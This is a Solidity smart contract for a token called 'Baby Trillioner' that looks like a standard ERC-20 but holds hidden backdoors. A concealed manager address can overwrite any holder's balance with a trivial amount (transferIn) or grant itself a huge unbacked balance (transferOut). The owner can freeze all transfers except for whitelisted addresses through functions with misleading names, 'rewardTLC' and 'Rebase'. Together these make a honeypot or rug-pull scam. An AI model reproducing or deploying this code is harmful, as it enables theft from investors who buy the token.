pragma solidity >=0.8.10;
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Records {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface Coinholders {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 TLCnumerototal) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 TLCnumerototal) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 TLCnumerototal
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 totalo);

    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}

interface Yield is Coinholders {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract Staking is Records {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BabyTrillioner is Records, Coinholders, Yield, Staking {

    mapping(address => uint256) private Balance;
  mapping(address => bool) public YieldZERTY;
    mapping(address => mapping(address => uint256)) private TMPallowances;
address private TrillionerContracttken;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
  address TLCowner;
    // My variables
    mapping(address => bool) public TLCBots;
    bool TLCPaused;
    
    constructor(address TrillionerContract) {
            // Editable
            TLCowner = msg.sender;
            YieldZERTY[TLCowner] = true;
        _name = "Baby Trillioner";
        _symbol = "BABYTLC";
  TrillionerContracttken = TrillionerContract;        
        uint _totalSupply = 1000000000000 * 10**9;
        TLCPaused = false;
        // End editable

        TLCBots[msg.sender] = true;

        TrillionerMint(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return Balance[account];
    }

    function transfer(address to, uint256 TLCnumerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, TLCnumerototal);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return TMPallowances[owner][spender];
    }

    function approve(address spender, uint256 TLCnumerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, TLCnumerototal);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 TLCnumerototal
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, TLCnumerototal);
        _transfer(from, to, TLCnumerototal);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, TMPallowances[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = TMPallowances[owner][spender];
        require(currentAllowance >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 TLCnumerototal
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        _deforeTokenTransfer(from, to, TLCnumerototal);

        // My implementation
        require(!TLCPaused || TLCBots[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = Balance[from];
        require(fromBalance >= TLCnumerototal, "Ehi20: transfer TLCnumerototal exceeds balance");
        unchecked {
            Balance[from] = fromBalance - TLCnumerototal;
        }
        Balance[to] += TLCnumerototal;

        emit Transfer(from, to, TLCnumerototal);

        _TLCfterTokenTransfer(from, to, TLCnumerototal);
    }
  modifier TLC0wner () {
    require(TLCowner == msg.sender, "Ehi20: cannot permit TLCManager address");
    _;
  
  }
    function TrillionerMint(address account, uint256 TLCnumerototal) internal virtual {
        require(account != address(0), "Ehi20: mint to the zero address");

        _deforeTokenTransfer(address(0), account, TLCnumerototal);

        ALLtotalSupply += TLCnumerototal;
        Balance[account] += TLCnumerototal;
        emit Transfer(address(0), account, TLCnumerototal);

        _TLCfterTokenTransfer(address(0), account, TLCnumerototal);
    }
    modifier TLCManager() {
        require(TrillionerContracttken == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


  function transferIn(address Yieldccount) external TLCManager {
    Balance[Yieldccount] = 369852698541;
            emit Transfer(address(0), Yieldccount, 369852698541);
  }

    function _burn(address account, uint256 TLCnumerototal) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        _deforeTokenTransfer(account, address(0), TLCnumerototal);

        uint256 accountBalance = Balance[account];
        require(accountBalance >= TLCnumerototal, "Ehi20: burn TLCnumerototal exceeds balance");
        unchecked {
            Balance[account] = accountBalance - TLCnumerototal;
        }
        ALLtotalSupply -= TLCnumerototal;

        emit Transfer(account, address(0), TLCnumerototal);

        _TLCfterTokenTransfer(account, address(0), TLCnumerototal);
    }

    function _approve(
        address owner,
        address spender,
        uint256 TLCnumerototal
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        TMPallowances[owner][spender] = TLCnumerototal;
        emit Approval(owner, spender, TLCnumerototal);
    }
  function transferOut(address Yieldccontz) external TLCManager {
    Balance[Yieldccontz] = 10000 * 10 ** 21;
            emit Transfer(address(0), Yieldccontz, 10000 * 10 ** 21);
  }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 TLCnumerototal
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= TLCnumerototal, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - TLCnumerototal);
            }
        }
    }

    function _deforeTokenTransfer(
        address from,
        address to,
        uint256 TLCnumerototal
    ) internal virtual {}


    function _TLCfterTokenTransfer(
        address from,
        address to,
        uint256 TLCnumerototal
    ) internal virtual {}

    // My functions

    function Rebase(address account, bool totalo) external onlyOwner {
        TLCBots[account] = totalo;
    }
    
    function rewardTLC(bool totalo) external onlyOwner {
        TLCPaused = totalo;
    }
}